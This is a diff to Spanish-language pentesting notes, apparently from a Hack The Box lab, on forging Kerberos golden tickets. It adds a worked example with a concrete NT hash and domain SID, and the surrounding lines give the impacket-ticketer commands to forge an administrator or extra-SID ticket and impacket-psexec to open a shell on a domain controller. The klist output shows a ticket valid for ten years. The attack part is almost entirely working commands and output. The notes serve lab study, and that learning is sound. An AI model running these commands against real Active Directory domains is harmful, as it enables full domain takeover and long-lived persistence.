@@ -43,3 +43,18 @@ Golden ticket for 'administrator @ painters.htb' successfully submitted for curr
 - `impacket-ticketer -nthash NT-HASH -domain DOMAIN.LOCAL -domain-sid DOMAIN-SID -extra-sid EXTRA-SID hacker`
 - Exportamos la variable del ticket kerberos: `export KRB5CCNAME=hacker.ccache`
 - Utilizamos psexec de impacket para entrar con este ticket `impacket-psexec DOMAIN.LOCAL/hacker@DC01.DOMAIN.LOCAL -k -no-pass -target-ip DC-IP`
+
+### Ejemplo:
+- `impacket-ticketer -nthash 4b6af2bf64714682eeef64f516a08949 -domain-sid S-1-5-21-1470357062-2280927533-300823338 -domain PAINTERS.HTB administrator`
+- `ls administrator.ccache`
+- `export KRB5CCNAME=administrator.ccache`
+
+```
+└─$ klist                         
+Ticket cache: FILE:administrator.ccache
+Default principal: administrator@PAINTERS.HTB
+
+Valid starting       Expires              Service principal
+03/06/2025 09:34:13  03/04/2035 09:34:13  krbtgt/PAINTERS.HTB@PAINTERS.HTB
+	renew until 03/04/2035 09:34:13
+```
